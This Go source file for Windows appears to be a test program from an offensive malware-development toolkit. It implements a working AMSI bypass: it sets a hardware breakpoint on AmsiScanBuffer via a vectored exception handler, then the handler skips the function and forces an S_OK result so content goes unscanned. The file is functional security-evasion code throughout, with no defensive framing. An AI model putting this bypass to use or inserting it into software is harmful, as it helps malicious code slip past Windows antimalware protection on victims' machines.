//go:build windows
// +build windows

package main

import (
	"fmt"
	"unsafe"

	"github.com/redt1de/malice/pkg/dbg"
	"github.com/redt1de/malice/pkg/veh"
	"golang.org/x/sys/windows"
)

// GOOS=windows GOARCH=amd64 go build -o /work/maldev/testing/veh.exe cmd/veh/vehamsi.go

func main() {
	test := windows.NewLazyDLL("amsi.dll")
	pAmsiScanBuffer := test.NewProc("AmsiScanBuffer")

	// test unhooked call, with bad args
	r1, _, _ := pAmsiScanBuffer.Call(0, 0, 0, 0)
	fmt.Printf("unhooked call, should return invalid args (0x80070057): 0x%x\n", r1)

	vh, _ := veh.New(windows.NewCallback(handler))
	fmt.Println("\nVEH hook in place!\n")

	// vh.SetBPLocal(pAmsiScanBuffer.Addr())
	vh.SetBPGlobal(pAmsiScanBuffer.Addr())

	dbg.Debug = true
	dbg.Pause()
	// test hooked call, with bad args
	r1, _, _ = pAmsiScanBuffer.Call(0, 0, 0, 0)
	fmt.Printf("hooked call, should return S_OK (0x0): 0x%x\n", r1)
}

//go:nosplit
func handler(e *veh.EXCEPTION_POINTERS) uintptr {
	if e.ExceptionRecord.ExceptionCode == veh.EXCEPTION_SINGLE_STEP && e.ExceptionRecord.ExceptionAddress == veh.TargetAddr {
		// get the return address from the stack, and set the RIP to it
		println(">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
		rsp2ptr := unsafe.Pointer(uintptr(e.ContextRecord.Rsp))
		addrFromRsp := unsafe.Slice((*byte)(unsafe.Pointer(uintptr(rsp2ptr))), 8) // readMemory(uintptr(rsp2ptr), 8)
		ReturnAddress := *(*uint64)(unsafe.Pointer(&addrFromRsp[0]))
		e.ContextRecord.Rip = ReturnAddress
		e.ContextRecord.Rsp += 8

		// change the return value
		e.ContextRecord.Rax = 0 // S_OK
		// e.ContextRecord.Rax = 0x80070057 // E_INVALIDARG

		// Remove the breakpoint
		e.ContextRecord.Dr0 = 0
		e.ContextRecord.Dr7 = veh.SetBits(e.ContextRecord.Dr7, 0, 1, 0)
		e.ContextRecord.Dr6 = 0
		e.ContextRecord.EFlags |= 0x10000
		return uintptr(veh.UEXCEPTION_CONTINUE_EXECUTION)
	}

	return uintptr(veh.EXCEPTION_CONTINUE_SEARCH)
}
